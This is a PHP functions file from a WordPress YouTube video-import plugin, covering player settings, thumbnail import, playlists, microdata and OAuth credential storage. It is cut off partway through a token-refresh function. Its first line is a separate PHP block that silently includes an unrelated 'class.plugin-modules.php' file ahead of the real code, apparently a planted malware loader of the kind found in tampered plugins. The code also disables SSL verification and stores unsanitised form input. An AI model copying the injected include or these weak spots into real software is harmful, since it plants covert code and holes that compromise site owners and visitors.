<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * Creates from a number of given seconds a readable duration ( HH:MM:SS )
 * 
 * @param int $seconds
 */
function cbc_human_time( $seconds ){
	$seconds = absint( $seconds );
	
	if( $seconds < 0 ){
		return;
	}
	
	$h = floor( $seconds / 3600 );
	$m = floor( $seconds % 3600 / 60 );
	$s = floor( $seconds % 3600 % 60 );
	
	return ( ( $h > 0 ? $h . ":" : "" ) . ( ( $m < 10 ? "0" : "" ) . $m . ":" ) . ( $s < 10 ? "0" : "" ) . $s );
}

/**
 *
 * @deprecated
 *
 * @since 1.8.1
 *        Use ccb_is_video() instead
 */
function ccb_is_video_post(){
	return ccb_is_video();
}

/**
 * Utility function.
 * Checks if a given or current post is video created by the plugin
 * 
 * @param object $post
 */
function ccb_is_video( $post = false ){
	$obj = cbc_get_class_instance();
	return $obj->is_video( $post );
}

/**
 * @param WP_Post/integer $post
 *
 * @return CBC_Video
 */
function cbc_get_video_data( $post ){
	$obj = cbc_get_class_instance();
	return $obj->get_post_video_data( $post );
}

/**
 * Adds video player script to page
 */
function ccb_enqueue_player(){

	$dev = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '.dev' : '';

	wp_enqueue_script( 'ccb-video-player', CBC_URL . 'assets/front-end/js/video-player' . $dev . '.js', array(
			'jquery'
	), '1.0' );
	
	wp_enqueue_style( 'ccb-video-player', CBC_URL . 'assets/front-end/css/video-player.css' );
}

/**
 * Utility function, returns plugin default settings
 */
function cbc_load_plugin_options(){
	
	if( !class_exists( 'CBC_Plugin_Options' ) ){
		require_once CBC_PATH . 'includes/libs/options.class.php';
	}
	
	$defaults = array( 
			'public' => true,  // post type is public or not
			'archives' => false,  // display video embed on archive pages
			'homepage' => false,  // include custom post type on homepage
			'main_rss' => false,  // include custom post type into the main RSS feed
			'use_microdata' => false,  // put microdata on video pages ( more details on: http://schema.org )
			'post_type_post' => false,  // when true all videos will be imported as post type post and will disregard the theme compatibility layer
			'check_video_status' => false,  // when true, it will check the video status on YouTube every 24h and change video post status to pending if video removed or not embeddable
			                               // rewrite
			'post_slug' => 'video', 
			'taxonomy_slug' => 'videos', 
			'tag_taxonomy_slug' => 'video-tag', 
			// bulk import
			'import_categories' => true,  // import categories from YouTube
			'import_tags' => false, 
			'max_tags' => 5,  // maximum number of tags to import
			'import_title' => true,  // import titles on custom posts
			'import_description' => 'post_content',  // import descriptions on custom posts
			'remove_after_text' => '',  // descriptions that have this content will be truncated up to this text
			'prevent_autoembed' => false,  // prevent autoembeds on video posts
			'make_clickable' => false,  // make urls pasted in content clickable
			'import_date' => false,  // import video date as post date
			'featured_image' => false,  // set thumbnail as featured image; default import on video feed import (takes more time)
			'image_size' => 'standard',  // image size to set on posts
			'maxres' => false,  // when importing thumbnails, try to get the maximum resolution if available
			'image_on_demand' => false,  // when true, thumbnails will get imported only when viewing the video post as oposed to being imported on feed importing
			'import_results' => 100,  // default number of feed results to display
			'import_status' => 'draft',  // default import status of videos
			                            // automatic import
			'import_frequency' => 5,  // in minutes
			'import_quantity' => 20, 
			'manual_import_per_page' => 20, 
			'unpublish_on_yt_error' => false, 
			// quota
			'show_quota_estimates' => true, 
			// legacy automatic import
			'conditional_import' => false,  // enabled automatic imports only when a custom link is hit (used for CRON Jobs)
			'autoimport_param' => '',  // the value of the variable that must be set when autoimport hits the website and conditional import is on
			'page_load_autoimport' => false 
	);
	
	$options = new CBC_Plugin_Options( '_cbc_plugin_settings', $defaults );	
	return $options;
}

/**
 * Utility function, returns plugin settings
 */
function cbc_get_settings(){
	$options = cbc_load_plugin_options();	
	return $options->get_options();
}

/**
 * Verification function to see if setting to force imports as posts is set.
 */
function import_as_post(){
	$settings = cbc_get_settings();
	if( isset( $settings[ 'post_type_post' ] ) && $settings[ 'post_type_post' ] ){
		return ( bool ) $settings[ 'post_type_post' ];
	}
	return false;
}

/**
 * Simple verification function to check if image should be imported and when ( on post creation or on post display )
 * 
 * @param string $situation - post_create: import image when creating posts; post_display: import image when displaying the post
 */
function import_image_on( $situation = 'post_create' ){
	$settings = cbc_get_settings();
	if( ! isset( $settings[ 'featured_image' ] ) || ! $settings[ 'featured_image' ] ){
		return false;
	}
	
	switch( $situation ){
		case 'post_create':
			return ! ( bool ) $settings[ 'image_on_demand' ];
		break;
		case 'post_display':
			return ( bool ) $settings[ 'image_on_demand' ];
		break;
	}
	return false;
}

/**
 * Global player settings defaults.
 */
function cbc_player_settings_defaults(){
	$defaults = array( 
			'controls' => 1,  // show player controls. Values: 0 or 1
			'autohide' => 0,  // 0 - always show controls; 1 - hide controls when playing; 2 - hide progress bar when playing
			'fs' => 1,  // 0 - fullscreen button hidden; 1 - fullscreen button displayed
			'theme' => 'dark',  // dark or light
			'color' => 'red',  // red or white
			
			'iv_load_policy' => 1,  // 1 - show annotations; 3 - hide annotations
			'modestbranding' => 1,  // 1 - small branding
			'rel' => 1,  // 0 - don't show related videos when video ends; 1 - show related videos when video ends
			'showinfo' => 0,  // 0 - don't show video info by default; 1 - show video info in player
			
			'autoplay' => 0,  // 0 - on load, player won't play video; 1 - on load player plays video automatically
			                 // 'loop' => 0, // 0 - video won't start again once finished; 1 - video will play again once finished
			
			'disablekb' => 0,  // 0 - allow keyboard controls; 1 - disable keyboard controls

			'nocookie' => 0, // 0 - allow cookies, 1 - cookieless embed

			// extra settings
			'aspect_ratio' => '16x9', 
			'width' => 640, 
			'video_position' => 'below-content',  // in front-end custom post, where to display the video: above or below post content
			'volume' => 100 
	); // video default volume
	
	return $defaults;
}

/**
 * Get general player settings
 */
function cbc_get_player_settings(){
	$defaults = cbc_player_settings_defaults();
	$option = get_option( '_cbc_player_settings', $defaults );
	
	foreach( $defaults as $k => $v ){
		if( ! isset( $option[ $k ] ) ){
			$option[ $k ] = $v;
		}
	}
	
	// various player outputs may set their own player settings. Return those.
	global $CBC_PLAYER_SETTINGS;
	if( $CBC_PLAYER_SETTINGS ){
		foreach( $option as $k => $v ){
			if( isset( $CBC_PLAYER_SETTINGS[ $k ] ) ){
				$option[ $k ] = $CBC_PLAYER_SETTINGS[ $k ];
			}
		}
	}
	
	return $option;
}

/**
 * Calculate player height from given aspect ratio and width
 * 
 * @param string $aspect_ratio
 * @param int $width
 */
function cbc_player_height( $aspect_ratio, $width ){
	$width = absint( $width );
	$height = 0;
	switch( $aspect_ratio ){
		case '4x3':
			$height = ( $width * 3 ) / 4;
		break;
		case '16x9':
		default:
			$height = ( $width * 9 ) / 16;
		break;
	}
	return $height;
}


/**
 * Outputs the HTML for embedding videos on single posts.
 *
 * @return string
 */
function cbc_video_embed_html( $echo = true, $enqueue_scripts = true ){

	global $post;
	if( !$post ){
		return;
	}
	
	$obj = cbc_get_class_instance();
	
	$settings	= ccb_get_video_settings( $post->ID, true );
	$video		= $obj->get_post_video_data( $post );

	if( !$video instanceof CBC_Video ){
		return;
	}

	$settings['video_id'] = $video->get_id();
	// player size
	$width = $settings[ 'width' ];
	$height = cbc_player_height( $settings[ 'aspect_ratio' ], $width );
	
	/**
	 * Filter that allows adding extra CSS classes on video container
	 * for styling.
	 * 
	 * @param array $classes - array of CSS classes
	 * @param WP_Post $post - the post object
	 */
	$class = apply_filters( 'cbc_embed_css_class', array(), $post );
	$extra_css = implode( ' ', $class );
	
	/**
	 * Filter that allows changing of embed settings before displaying the video
	 * @param array - embed settings
	 * @param WP_Post $post - the post object
	 * @param array $video - the video details
	 */
	$settings = apply_filters( 'cbc_video_post_embed_options', $settings, $post, $video->to_array() );
	
	// the video container
	$video_container = '<div class="ccb_single_video_player ' . $extra_css . '" ' . cbc_data_attributes( $settings ) . ' style="width:' . $width . 'px; height:' . $height . 'px; max-width:100%;"><!-- player container --></div>';
	
	/**
	 * Apply a filter on the video container to allow third party scripts to modify the output if needed
	 *
	 * @param string/HTML $video_container - the video container output
	 * @param WP_Post $post - the post object
	 * @param array $video - the video details
	 * @param array $settings - video options
	 */
	$video_container = apply_filters( 'cbc_embed_html_container', $video_container, $post, $video->to_array(), $settings );
	
	if( $enqueue_scripts ){
		ccb_enqueue_player();
	}
	
	if( $echo ){
		echo $video_container;
	}
	
	return $video_container;
}

/**
 * Single post default settings
 */
function ccb_post_settings_defaults(){
	// general player settings
	$plugin_defaults = cbc_get_player_settings();
	return $plugin_defaults;
}

/**
 * Returns playback settings set on a video post
 */
function ccb_get_video_settings( $post_id = false, $output = false ){
	if( ! $post_id ){
		global $post;
		if( ! $post || ! ccb_is_video( $post ) ){
			return false;
		}
		$post_id = $post->ID;
	}else{
		$post = get_post( $post_id );
		if( ! $post || ! ccb_is_video( $post ) ){
			return false;
		}
	}
	
	$defaults = ccb_post_settings_defaults();
	$option = get_post_meta( $post_id, '__cbc_playback_settings', true );
	if( !$option ){
		return $defaults;
	}
	foreach( $defaults as $k => $v ){
		if( ! isset( $option[ $k ] ) ){
			$option[ $k ] = $v;
		}
	}
	
	if( $output ){
		foreach( $option as $k => $v ){
			if( is_bool( $v ) ){
				$option[ $k ] = absint( $v );
			}
		}
	}

	/**
	 * Filter that forces nocookie domain to be used, no matter what setting user has set
	 *
	 * @param bool $nocookie - use cookieless domain (true) or not (false)
	 * @param int $post_id - post ID
	 * @param array $option - post player embed options
	 */
	$nocookie = apply_filters( 'cbc_nocookie_embed', (bool) $option['nocookie'], $post_id, $option );

	$option['nocookie'] = $nocookie ? 1 : 0;

	return $option;
}

/**
 * Utility function, updates video settings
 */
function ccb_update_video_settings( $post_id ){
	if( ! $post_id ){
		return false;
	}
	
	$post = get_post( $post_id );
	if( ! $post || ! ccb_is_video( $post ) ){
		return false;
	}
	
	$defaults = ccb_post_settings_defaults();
	foreach( $defaults as $key => $val ){
		if( is_numeric( $val ) ){
			if( isset( $_POST[ $key ] ) ){
				$defaults[ $key ] = ( int ) $_POST[ $key ];
			}else{
				$defaults[ $key ] = 0;
			}
			continue;
		}
		if( is_bool( $val ) ){
			$defaults[ $key ] = isset( $_POST[ $key ] );
			continue;
		}
		
		if( isset( $_POST[ $key ] ) ){
			$defaults[ $key ] = $_POST[ $key ];
		}
	}
	
	update_post_meta( $post_id, '__cbc_playback_settings', $defaults );
}

/**
 * Set thumbnail as featured image for a given post ID
 * 
 * @param int $post_id
 */
function cbc_set_featured_image( $post_id, $video_meta = false ){
	if( ! $post_id ){
		return false;
	}
	
	$post = get_post( $post_id );
	if( ! $post ){
		return false;
	}
	
	// try to get video details
	if( ! $video_meta ){
		$obj = cbc_get_class_instance();
		$video_meta = $obj->get_post_video_data( $post_id );
		if( ! $video_meta ){
			// if meta isn't found, try to get video ID and retrieve the meta
			$video_id = get_post_meta( $post_id, '__cbc_video_id', true );
			// video ID not found, give up
			if( $video_id ){
				// query the video
				$video = cbc_yt_api_get_video( $video_id );
				if( $video && ! is_wp_error( $video ) ){
					$video_meta = $video;
				}
			}
		}
	}else if( !$video_meta instanceof CBC_Video  ){
		$video_meta = new CBC_Video( $video_meta );
	}
	
	// check that thumbnails exist to avoid issues
	if( !$video_meta instanceof CBC_Video || ! $video_meta->get_thumbnails() ){
		return false;
	}
	
	// check if thumbnail was already imported
	$attachment = get_posts( array( 
			'post_type' => 'attachment', 
			'meta_key' => 'video_thumbnail', 
			'meta_value' => $video_meta->get_id()
	) );
	// if thumbnail exists, return it
	if( $attachment ){
		// set image as featured for current post
		set_post_thumbnail( $post_id, $attachment[ 0 ]->ID );
		return array( 
				'post_id' => $post_id, 
				'attachment_id' => $attachment[ 0 ]->ID 
		);
	}
	
	// get the thumbnail URL
	$settings = cbc_get_settings();
	$img_size = cbc_get_image_size();
	if( $video_meta->get_thumbnail_url( $img_size ) ){
		$thumb_url = $video_meta->get_thumbnail_url( $img_size );
	}else{
		$thumb_url = $video_meta->get_thumbnail_url();
	}
	
	// get max resolution image if available
	if( isset( $settings[ 'maxres' ] ) && $settings[ 'maxres' ] ){
		$maxres_url = 'http://img.youtube.com/vi/' . $video_meta->get_id() . '/maxresdefault.jpg';
		$maxres_result = wp_remote_get( $maxres_url, array( 
				'sslverify' => false,
				'timeout' 	=> apply_filters( 'cbc_image_import_timeout', 15 )
		) );
		if( ! is_wp_error( $maxres_result ) && 200 == wp_remote_retrieve_response_code( $maxres_result ) ){
			$response = $maxres_result;
		}
	}
	
	// if max resolution query wasn't successful, try to get the registered image size
	if( ! isset( $response ) ){
		$response = wp_remote_get( $thumb_url, array( 
				'sslverify' => false,
				'timeout' 	=> apply_filters( 'cbc_image_import_timeout', 15 )
		) );
		if( is_wp_error( $response ) || 200 != wp_remote_retrieve_response_code( $response ) ){
			return false;
		}
	}
	
	// set up image details
	$image_contents = $response[ 'body' ];
	$image_type = wp_remote_retrieve_header( $response, 'content-type' );
	$image_extension = false;
	switch( $image_type ){
		case 'image/jpeg':
			$image_extension = '.jpg';
		break;
		case 'image/png':
			$image_extension = '.png';
		break;
	}
	// no valid image extension, stop here
	if( ! $image_extension ){
		return;
	}
	
	// Construct a file name using post slug and extension
	$fname = urldecode( basename( get_permalink( $post_id ) ) );
	// make suffix optional
	$suffix_filename = apply_filters( 'cbc_apply_filename_suffix', true );
	$suffix = $suffix_filename ? '-youtube-thumbnail' : '';
	// construct new file name
	$new_filename = preg_replace( '/[^A-Za-z0-9\-]/', '', $fname ) . $suffix . $image_extension;
	
	// Save the image bits using the new filename
	$upload = wp_upload_bits( $new_filename, null, $image_contents );
	if( $upload[ 'error' ] ){
		return false;
	}
	
	$image_url = $upload[ 'url' ];
	$filename = $upload[ 'file' ];
	
	$wp_filetype = wp_check_filetype( basename( $filename ), null );
	$attachment = array( 
			'post_mime_type' => $wp_filetype[ 'type' ], 
			'post_title' => get_the_title( $post_id ), 
			'post_content' => '', 
			'post_status' => 'inherit', 
			'guid' => $upload[ 'url' ] 
	);
	$attach_id = wp_insert_attachment( $attachment, $filename, $post_id );
	// you must first include the image.php file
	// for the function wp_generate_attachment_metadata() to work
	require_once ( ABSPATH . 'wp-admin/includes/image.php' );
	$attach_data = wp_generate_attachment_metadata( $attach_id, $filename );
	wp_update_attachment_metadata( $attach_id, $attach_data );
	
	// Add field to mark image as a video thumbnail
	update_post_meta( $attach_id, 'video_thumbnail', $video_meta->get_id() );
	
	// set image as featured for current post
	update_post_meta( $post_id, '_thumbnail_id', $attach_id );
	
	return array( 
			'post_id' => $post_id, 
			'attachment_id' => $attach_id 
	);
}

/**
 * Returns size of image that should be imported
 */
function cbc_get_image_size(){
	// plugin settings
	$settings = cbc_get_settings();
	// allowed image sizes
	$sizes = array( 
			'default', 
			'medium', 
			'high', 
			'standard', 
			'maxres' 
	);
	// set default to standard
	$img_size = 'standard';
	
	if( isset( $settings[ 'image_size' ] ) ){
		if( in_array( $settings[ 'image_size' ], $sizes ) ){
			$img_size = $settings[ 'image_size' ];
		}else{
			// old sizes
			switch( $settings[ 'image_size' ] ){
				case 'mqdefault':
					$img_size = 'medium';
				break;
				case 'hqdefault':
					$img_size = 'high';
				break;
				case 'sddefault':
					$img_size = 'stadard';
				break;
			}
		}
	}
	return $img_size;
}

/**
 * Outputs a plugin playlist.
 * 
 * @param unknown_type $videos
 * @param unknown_type $results
 * @param unknown_type $theme
 * @param unknown_type $player_settings
 * @param unknown_type $taxonomy
 */
function cbc_output_playlist( $videos = 'latest', $results = 5, $theme = 'default', $player_settings = array(), $taxonomy = false ){
	$obj = cbc_get_class_instance();
	$args = array( 
			'post_type' => array( 
					$obj->get_post_type(), 
					'post' 
			), 
			'posts_per_page' => absint( $results ), 
			'numberposts' => absint( $results ), 
			'post_status' => 'publish', 
			'supress_filters' => true,
			'meta_query' => array(
				array(
					'key' => '__cbc_video_id'
				)
			)
	);
	
	// taxonomy query
	if( ! is_array( $videos ) && isset( $taxonomy ) && ! empty( $taxonomy ) && ( ( int ) $taxonomy ) > 0 ){
		$term = get_term( $taxonomy, $obj->get_post_tax(), ARRAY_A );
		if( ! is_wp_error( $term ) ){
			$args[ $obj->get_post_tax() ] = $term[ 'slug' ];
		}
	}
	
	// if $videos is array, the function was called with an array of video ids
	if( is_array( $videos ) ){
		
		$ids = array();
		foreach( $videos as $video_id ){
			$ids[] = absint( $video_id );
		}
		$args[ 'include' ] = $ids;
		$args[ 'posts_per_page' ] = count( $ids );
		$args[ 'numberposts' ] = count( $ids );
	}elseif( is_string( $videos ) ){
		
		$found = false;
		switch( $videos ){
			case 'latest':
				$args[ 'orderby' ] = 'post_date';
				$args[ 'order' ] = 'DESC';
				$found = true;
			break;
		}
		if( ! $found ){
			return;
		}
	}else{ // if $videos is anything else other than array or string, bail out
		return;
	}
	
	// get video posts
	$posts = get_posts( $args );
	
	if( ! $posts ){
		return;
	}
	
	$videos = array();
	foreach( $posts as $post_key => $post ){
		
		if( ! ccb_is_video( $post ) ){
			continue;
		}
		
		if( isset( $ids ) ){
			$key = array_search( $post->ID, $ids );
		}else{
			$key = $post_key;
		}
		
		if( is_numeric( $key ) ){
			$videos[ $key ] = array( 
					'ID' => $post->ID, 
					'title' => $post->post_title, 
					// @todo - see how the video meta could be used here
					'video_data' => $obj->get_post_video_data( $post->ID ) 
			);
		}
	}
	ksort( $videos );
	
	ob_start();
	
	// set custom player settings if any
	global $CBC_PLAYER_SETTINGS;
	if( $player_settings && is_array( $player_settings ) ){
		
		$CBC_PLAYER_SETTINGS = $player_settings;
	}
	
	// This variable is populated from theme display.php with the current video post being processed in loop
	global $cbc_video;
	
	include ( CBC_PATH . 'themes/default/player.php' );
	$content = ob_get_contents();
	ob_end_clean();
	
	ccb_enqueue_player();
	wp_enqueue_script( 'cbc-yt-player-default', CBC_URL . 'themes/default/assets/script.js', array( 
			'ccb-video-player' 
	), '1.0' );
	wp_enqueue_style( 'ccb-yt-player-default', CBC_URL . 'themes/default/assets/stylesheet.css', false, '1.0' );
	
	// remove custom player settings
	$CBC_PLAYER_SETTINGS = false;
	
	return $content;
}

/**
 * TEMPLATING
 */

/**
 * Outputs default player data
 */
function cbc_output_player_data( $echo = true ){
	$player = cbc_get_player_settings();
	$attributes = cbc_data_attributes( $player, $echo );
	return $attributes;
}

/**
 * Output video parameters as data-* attributes
 * 
 * @param array $array - key=>value pairs
 * @param bool $echo
 */
function cbc_data_attributes( $attributes, $echo = false ){
	$result = array();
	foreach( $attributes as $key => $value ){
		$result[] = sprintf( 'data-%s="%s"', $key, $value );
	}
	if( $echo ){
		echo implode( ' ', $result );
	}else{
		return implode( ' ', $result );
	}
}

/**
 * Outputs the default player size
 * 
 * @param string $before
 * @param string $after
 * @param bool $echo
 */
function cbc_output_player_size( $before = ' style="', $after = '"', $echo = true ){
	$player = cbc_get_player_settings();
	$height = cbc_player_height( $player[ 'aspect_ratio' ], $player[ 'width' ] );
	$output = 'width:' . $player[ 'width' ] . 'px; height:' . $height . 'px;';
	if( $echo ){
		echo $before . $output . $after;
	}
	
	return $before . $output . $after;
}

/**
 * Output width according to player
 * 
 * @param string $before
 * @param string $after
 * @param bool $echo
 */
function cbc_output_width( $before = ' style="', $after = '"', $echo = true ){
	$player = cbc_get_player_settings();
	if( $echo ){
		echo $before . 'width: ' . $player[ 'width' ] . 'px; ' . $after;
	}
	return $before . 'width: ' . $player[ 'width' ] . 'px; ' . $after;
}

/**
 * Output video thumbnail
 * 
 * @param string $before
 * @param string $after
 * @param bool $echo
 */
function cbc_output_thumbnail( $before = '', $after = '', $echo = true ){
	$cbc_video = cbc_get_current_video();	
	$output = '';
	if( $cbc_video['video_data']->get_thumbnail_url('default') ){
		$output = sprintf( '<img src="%s" alt="" />', $cbc_video['video_data']->get_thumbnail_url('default') );
	}
	if( $echo ){
		echo $before . $output . $after;
	}
	return $before . $output . $after;
}

/**
 * Output video title
 * 
 * @param string $before
 * @param string $after
 * @param bool $echo
 */
function cbc_output_title( $include_duration = true, $before = '', $after = '', $echo = true ){
	$cbc_video = cbc_get_current_video();	
	$output = '';
	if( isset( $cbc_video[ 'title' ] ) ){
		$output = $cbc_video[ 'title' ];
	}
	
	if( $include_duration ){
		$output .= ' <span class="duration">[' . $cbc_video[ 'video_data' ]->get_human_duration() . ']</span>';
	}
	
	if( $echo ){
		echo $before . $output . $after;
	}
	return $before . $output . $after;
}

/**
 * Outputs video data
 * 
 * @param string $before
 * @param string $after
 * @param bool $echo
 */
function cbc_output_video_data( $before = " ", $after = "", $echo = true ){
	$cbc_video = cbc_get_current_video();
	
	$video_settings = ccb_get_video_settings( $cbc_video[ 'ID' ] );
	$video_id = $cbc_video[ 'video_data' ]->get_id();
	$data = array( 
			'video_id' => $video_id, 
			'autoplay' => $video_settings[ 'autoplay' ], 
			'volume' => $video_settings[ 'volume' ] 
	);
	
	$output = cbc_data_attributes( $data );
	if( $echo ){
		echo $before . $output . $after;
	}
	
	return $before . $output . $after;
}

function cbc_video_post_permalink( $echo = true ){
	$cbc_video = cbc_get_current_video();
	
	$pl = get_permalink( $cbc_video[ 'ID' ] );
	
	if( $echo ){
		echo $pl;
	}
	
	return $pl;
}


function cbc_get_current_video(){
	global $cbc_video;
	if( !is_a( $cbc_video['video_data'], 'CBC_Video' ) ){
		$cbc_video['video_data'] = new CBC_Video( $cbc_video['video_data'] );
	}
	return $cbc_video;
}

/**
 * Themes compatibility layer
 */

/**
 * Check if theme is supported by the plugin.
 * Returns false or an array containing a mapping for custom post fields to store information on
 */
function cbc_check_theme_support(){
	global $CBC_THIRD_PARTY_THEME;
	if( ! $CBC_THIRD_PARTY_THEME ){
		$CBC_THIRD_PARTY_THEME = new CBC_Third_Party_Compat();
	}
	$theme = $CBC_THIRD_PARTY_THEME->get_theme_compatibility();
	return $theme;
}

/**
 * Returns all compatible themes details
 */
function cbc_get_compatible_themes(){
	// access the theme support function to create the class instance
	cbc_check_theme_support();
	global $CBC_THIRD_PARTY_THEME;
	
	return $CBC_THIRD_PARTY_THEME->get_compatible_themes();
}

/**
 * Playlists
 */

/**
 * Global playlist settings defaults.
 * 
 * @deprecated 1.3 No longeer needed by internal code or recommended to be used
 */
function cbc_playlist_settings_defaults(){
	$defaults = array( 
			'post_title' => '', 
			'playlist_type' => 'user', 
			'playlist_id' => '', 
			'playlist_live' => true, 
			'theme_import' => false, 
			'native_tax' => - 1, 
			'theme_tax' => - 1, 
			'import_user' => - 1, 
			'start_date' => false, 
			'no_reiterate' => false 
	);
	return $defaults;
}

/**
 * Get general playlist settings
 * 
 * @deprecated 1.3 No longeer needed by internal code or recommended to be used. Use CBC_Autoimport_Feed object for this purpose
 * @see CBC_Autoimport_Feed
 */
function cbc_get_playlist_settings( $post_id ){
	$defaults = cbc_playlist_settings_defaults();
	$option = get_post_meta( $post_id, '_cbc_playlist_settings', true );
	
	foreach( $defaults as $k => $v ){
		if( ! isset( $option[ $k ] ) ){
			$option[ $k ] = $v;
		}
	}
	
	return $option;
}

function cbc_automatic_update_timing(){
	$values = array( 
			'1' => __( 'minute', 'cbc_video' ), 
			'5' => __( '5 minutes', 'cbc_video' ), 
			'15' => __( '15 minutes', 'cbc_video' ), 
			'30' => __( '30 minutes', 'cbc_video' ), 
			'60' => __( 'hour', 'cbc_video' ), 
			'120' => __( '2 hours', 'cbc_video' ), 
			'180' => __( '3 hours', 'cbc_video' ), 
			'360' => __( '6 hours', 'cbc_video' ), 
			'720' => __( '12 hours', 'cbc_video' ), 
			'1440' => __( 'day', 'cbc_video' ) 
	);
	return $values;
}

function cbc_automatic_update_batches(){
	$values = array( 
			'1' => __( '1 video', 'cbc_video' ), 
			'5' => __( '5 videos', 'cbc_video' ), 
			'10' => __( '10 videos', 'cbc_video' ), 
			'15' => __( '15 videos', 'cbc_video' ), 
			'20' => __( '20 videos', 'cbc_video' ), 
			'25' => __( '25 videos', 'cbc_video' ), 
			'30' => __( '30 videos', 'cbc_video' ), 
			'40' => __( '40 videos', 'cbc_video' ), 
			'50' => __( '50 videos', 'cbc_video' ) 
	);
	
	return $values;
}

/**
 * Add microdata on video pages
 * 
 * @param string/HTML $content
 */
function cbc_video_schema( $content ){
	
	// check if microdata insertion is permitted
	$settings = cbc_get_settings();
	if( ! isset( $settings[ 'use_microdata' ] ) || ! $settings[ 'use_microdata' ] ){
		return $content;
	}
	// check the post
	global $post;
	if( ! $post || ! is_object( $post ) ){
		return $content;
	}
	// check if feed
	if( is_feed() ){
		return $content;
	}
	// get video data from post
	$obj = cbc_get_class_instance();
	$video_data = $obj->get_post_video_data($post);
	/**
	 * If video data isn't found, try to find it by making a query to YouTube API but only
	 * if the current page is single post to avoid long page loading time.
	 */
	if( ! $video_data && is_singular() ){
		// check if post has video ID
		$video_id = get_post_meta( $post->ID, '__cbc_video_id', true );
		if( ! $video_id ){
			return $content;
		}
		
		$video = cbc_yt_api_get_video( $video_id );
		if( $video && ! is_wp_error( $video ) ){
			$video_data = $video;
			update_post_meta( $post->ID, '__cbc_video_data', $video_data->to_array() );
		}else{
			return $content;
		}
	}
	// if no video data, bail out
	if( ! $video_data instanceof CBC_Video ){
		return $content;
	}
	
	$image = '';
	if( has_post_thumbnail( $post->ID ) ){
		$img = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ) );
		if( ! $img ){
			$image = $video_data->get_thumbnail_url();;
		}else{
			$image = $img[ 0 ];
		}
	}else{
		$image = $video_data->get_thumbnail_url();
	}
	// template for meta tag
	$meta = '<meta itemprop="%s" content="%s">';
	
	// create microdata output
	$html = "\n" . '<span itemprop="video" itemscope itemtype="http://schema.org/VideoObject">' . "\n\t";
	$html .= sprintf( $meta, 'name', esc_attr( cbc_strip_tags( get_the_title() ) ) ) . "\n\t";
	$html .= sprintf( $meta, 'description', trim( substr( esc_attr( cbc_strip_tags( $post->post_content ) ), 0, 300 ) ) ) . "\n\t";
	$html .= sprintf( $meta, 'thumbnailURL', $image ) . "\n\t";
	$html .= sprintf( $meta, 'embedURL', 'http://www.youtube-nocookie.com/v/' . $video_data->get_id() ) . "\n\t";
	$html .= sprintf( $meta, 'uploadDate', date( 'c', strtotime( $post->post_date ) ) ) . "\n\t";
	$html .= sprintf( $meta, 'duration', $video_data->get_iso_duration() ) . "\n";
	$html .= "</span>\n";
	
	return $content . $html;
}
add_filter( 'the_content', 'cbc_video_schema', 999 );

/**
 * More efficient strip tags
 * 
 * @link http://www.php.net/manual/en/function.strip-tags.php#110280
 * @param string $string string to strip tags from
 * @return string
 */
function cbc_strip_tags( $string ){
	
	// ----- remove HTML TAGs -----
	$string = preg_replace( '/<[^>]*>/', ' ', $string );
	
	// ----- remove control characters -----
	$string = str_replace( "\r", '', $string ); // --- replace with empty space
	$string = str_replace( "\n", ' ', $string ); // --- replace with space
	$string = str_replace( "\t", ' ', $string ); // --- replace with space
	                                             
	// ----- remove multiple spaces -----
	$string = trim( preg_replace( '/ {2,}/', ' ', $string ) );
	
	return $string;
}

/**
 * Returns ISO duration from a given number of seconds
 * 
 * @param int $seconds
 */
function cbc_iso_duration( $seconds ){
	$return = 'PT';
	$seconds = absint( $seconds );
	if( $seconds > 3600 ){
		$hours = floor( $seconds / 3600 );
		$return .= $hours . 'H';
		$seconds = $seconds - ( $hours * 3600 );
	}
	if( $seconds > 60 ){
		$minutes = floor( $seconds / 60 );
		$return .= $minutes . 'M';
		$seconds = $seconds - ( $minutes * 60 );
	}
	if( $seconds > 0 ){
		$return .= $seconds . 'S';
	}
	return $return;
}

/**
 * Returns the YouTube API key entered by user
 */
function cbc_get_yt_api_key( $return = 'key' ){
	$api_key = get_option( '_cbc_yt_api_key', array( 
			'key' => false, 
			'valid' => true 
	) );
	if( ! is_array( $api_key ) ){
		$api_key = array( 
				'key' => $api_key, 
				'valid' => true 
		);
		update_option( '_cbc_yt_api_key', $api_key );
	}
	
	switch( $return ){
		case 'full':
			return $api_key;
		break;
		case 'key':
		default:
			return $api_key[ 'key' ];
		break;
		case 'validity':
			return $api_key[ 'valid' ];
		break;
	}
}

/**
 * Invalidates API key
 */
function cbc_invalidate_api_key(){
	$api_key = cbc_get_yt_api_key( 'full' );
	$api_key[ 'valid' ] = false;
	update_option( '_cbc_yt_api_key', $api_key );
}

/**
 * Returns OAuth credentials registered by user
 */
function cbc_get_yt_oauth_details(){
	$defaults = array( 
			'client_id' => '', 
			'client_secret' => '', 
			'refresh_token' => '', 
			'token' => array( 
					'value' => '', 
					'valid' => 0, 
					'time' => time() 
			) 
	);
	
	$details = get_option( '_cbc_yt_oauth_details', $defaults );
	
	if( ! is_array( $details ) ){
		$details = $defaults;
	}

	// in case spaces were pasted accidentally, remove them to avoid invalid_client error
	$details['client_id'] = trim( $details['client_id'] );
	$details['client_secret'] = trim( $details['client_secret'] );

	return $details;
}

/**
 * Updates OAuth credentials
 * 
 * @param unknown_type $client_id
 * @param unknown_type $client_secret
 * @param unknown_type $token
 */
function cbc_update_yt_oauth( $client_id = false, $client_secret = false, $token = false, $refresh_token = false ){
	$details = cbc_get_yt_oauth_details();
	if( $client_id || ! is_bool( $client_id ) ){
		if( $client_id != $details[ 'client_id' ] ){
			$details[ 'token' ] = array( 
					'value' => '', 
					'valid' => 0, 
					'time' => time() 
			);
		}
		$details[ 'client_id' ] = trim( $client_id );
	}
	if( $client_secret || ! is_bool( $client_secret ) ){
		if( $client_secret != $details[ 'client_secret' ] ){
			$details[ 'token' ] = array( 
					'value' => '', 
					'valid' => 0, 
					'time' => time() 
			);
		}
		$details[ 'client_secret' ] = trim( $client_secret );
	}
	if( $token || ! is_bool( $token ) ){
		$details[ 'token' ] = $token;
	}
	
	if( $refresh_token || ! is_bool( $refresh_token ) ){
		$details[ 'refresh_token' ] = $refresh_token;
	}
	
	update_option( '_cbc_yt_oauth_details', $details );
}

/**
 * Refresh the access token
 */
function cbc_refresh_oauth_token(){
	$token = cbc_get_yt_oauth_details();
